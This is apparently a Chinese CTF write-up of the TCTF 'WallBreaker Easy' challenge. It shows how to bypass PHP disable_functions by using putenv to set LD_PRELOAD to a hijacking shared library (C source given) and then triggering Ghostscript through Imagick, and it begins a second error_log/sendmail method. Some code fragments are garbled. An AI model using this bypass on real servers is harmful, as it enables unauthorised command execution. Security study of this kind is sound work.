## 前言：
上星期打完TCTF，到现在才有时间整理一下Write Up。Web方向总共只有两道题目，其中一题是 Java，我目前为止还无能为力，另外一题就是这道
WallBreaker Easy。话不多说，开始复现：
## 题目信息：
> Imagick is a awesome library for hackers to break `disable_functions`.  
>  So I installed php-imagick in the server, opened a `backdoor` for you.  
>  Let's try to execute `/readflag` to get the flag.  
>  Open basedir: /var/www/html:/tmp/3accb9900a8be5421641fb31e6861f33  
>  Hint: eval($_POST["backdoor"]);
disable_functions：
[
Imagick 相关信息：
[
下面我们来说说这道题目的几种解法
## 解法一：
### 1\. 利用 putenv 设置LD_PRELOAD变量
这里需要介绍一个前置知识：
> LD_PRELOAD 是 Linux 下的一个环境变量,动态链接器在载入一个程序所需的所有动态库之前,首先会载入LD_PRELOAD
> 环境变量所指定的动态库。
我们可以看到`disable_functions` 里面是没有 ban 掉 `putenv`
的，那么我们就可以用`putenv`设置`LD_PRELOAD`变量，引入自己的恶意动态链接库（共享对象）来劫持库函数，这样如果能再启动一个调用了这个库函数的程序，就可以实现
RCE 。
在此之前，大多是通过`mail` 函数来启动 `sendmail` ，然而在这里，`mail`函数被 ban 掉了，我们只能寻找其他能够启动外部程序的函数。
### 2\. 通过 ImageMagick 调用外部程序
根据题目描述，我们很自然的想到问题出现在 `php-imagick` ，而 `php-imagick`，其实只是软件`ImageMagick`的 PHP
拓展，所以我们需要首先了解一下`ImageMagick`。
引入官方描述：
> Use
> ImageMagick[®](http://tarr.uspto.gov/servlet/tarr?regser=serial&entry=78333969)
> to create, edit, compose, or convert bitmap images. It can read and write
> images in a variety of [formats](https://imagemagick.org/script/formats.php)
> (over 200) including PNG, JPEG, GIF, HEIC, TIFF,
> [DPX](https://imagemagick.org/script/motion-picture.php),
> [EXR](https://imagemagick.org/script/high-dynamic-range.php), WebP,
> Postscript, PDF, and SVG. Use ImageMagick to resize, flip, mirror, rotate,
> distort, shear and transform images, adjust image colors, apply various
> special effects, or draw text, lines, polygons, ellipses and Bézier curves.
可以看到 `ImageMagcik` 支持超过 200
种格式的文件处理，我们点击描述中的[链接](https://imagemagick.org/script/formats.php)即可看到具体的类型和描述：
很容易就能发现`ImageMagick` 在处理一些类型的文件的时候需要依赖其他软件。
找出所有调用 `Ghostscript` 的文件类型：
    EPI  EPS  EPS2 EPS3 EPSF EPSI EPT PDF PS PS2 PS3
先用 PDF 来试一试：
    __construct('1.pdf')
    #1 {main}
      thrown in /tmp/tctf/index.php on line 2
搜了一下发现是出于安全考虑，新版本`ImageMagick` 默认禁止了使用`Ghostscript`处理 PDF
文件。具体的配置文件在：`/etc/ImageMagick-6/policy.xml`，相关内容如下:
      ......
可以看到一起被禁止的还有文件拓展名包含`PS` `EPI` `XPS` 的文件，所以我们上面列举的文件类型里面就只有`EPT` 符合要求了。
执行 `$ convert 1.png ept:1.ept` 生成一个 `EPT` 文件,使用这个文件再次进行测试发现没有报错，
再执行`$ strace -f php index.php 2>&1 | grep -C2 execve`看一下有没有调用 `ghostscript`：
可以看到是有去执行`gs`的，说明我们的思路可行。
### 3\. 生成恶意动态链接库
首先执行 `readelf -Ws /usr/bin/gs`看一下这个程序都有哪些符号：
从符号中可以看出他调用的库函数，我们选择 `fflush` 这个函数来进行劫持：
    #include 
    #include 
    void payload() {
        const char* cmd = getenv('CMD')
        system(cmd);
    }
    int fflush() {
        if (getenv("LD_PRELOAD") == NULL) { return 0; }
        unsetenv("LD_PRELOAD");
        payload();
    }
使用 gcc 将上述内容编译成动态链接库，现在万事俱备，只欠东风！
### 4\. 发起攻击
首先将我们生成的 `EPT` 文件和`hack.so` 文件利用题目中的后门写入到服务器上，然后执行
    putenv('LD_PRELOAD=/tmp/3accb9900a8be5421641fb31e6861f33/hack.so'); 
    putenv('CMD=/readflag > /tmp/3accb9900a8be5421641fb31e6861f33/flag.txt');
    $img = new Imagick('/tmp/3accb9900a8be5421641fb31e6861f33/1.ept');
再读取 `flag.txt`，即可拿到 flag。
当然，`ImageMagick` 会调用的不只有`Ghostscript`，所以还有其他类型的文件可以利用，这里就不一一列举了。
## 解法二：
上面的解法是通过 `ImageMagick` 来启动`ghostscript`
并劫持其库函数，然而我们真的除了`ImageMagick`之外就找不到其他更通用的函数可以启动外部程序了吗？
### 1\. 利用 error_log 函数启动 sendmail
`error_log`
的具体信息我就不介绍了，大家可以到[官方文档](https://www.php.net/manual/zh/function.error-log.php)
查看。
这里我们要用到的就是当 `error_log` 的第二个参数 `message_type` 的值为 1 的时候，会调用`mail`
函数的同一个内置函数(会执行`sendmail` 命令)的特性。
那么思路和第一种解法类似，我们只要劫持 `sendmail` 调用的库函数，然后使用 `error_log`函数启动 `sendmail` 进程即可。
然而真的会这么简单吗？这里有一个问题，题目的服务器上根本没有安装`sendmail`! 因此即便环境变量被成功加载，并且 `error_log`
尝试去执行`sendmail`，也无法成功执行被我们劫持的库函数。